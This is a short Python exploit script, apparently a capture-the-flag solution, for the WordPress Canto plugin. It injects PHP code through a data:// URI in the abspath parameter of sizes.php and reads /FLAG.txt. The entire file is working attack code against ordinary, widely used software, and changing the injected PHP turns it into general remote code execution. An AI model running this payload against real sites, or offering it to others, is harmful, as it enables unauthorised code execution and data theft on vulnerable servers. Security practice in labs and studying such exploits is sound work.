import requests
import sys

'''
@文件命名：X-034-24
@使用方式: python X-034-24.py url
@简述思路: 利用 abspath=data:// 注入 PHP 代码，直接读取 /FLAG.txt。
'''


def Scan(url):
    p = "<?php echo file_get_contents('/FLAG.txt');die(); ?>"
    target = url + "/wp-content/plugins/canto/includes/lib/sizes.php?abspath=data://text/plain," + requests.utils.quote(p, safe='')
    return requests.get(target, timeout=5).text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
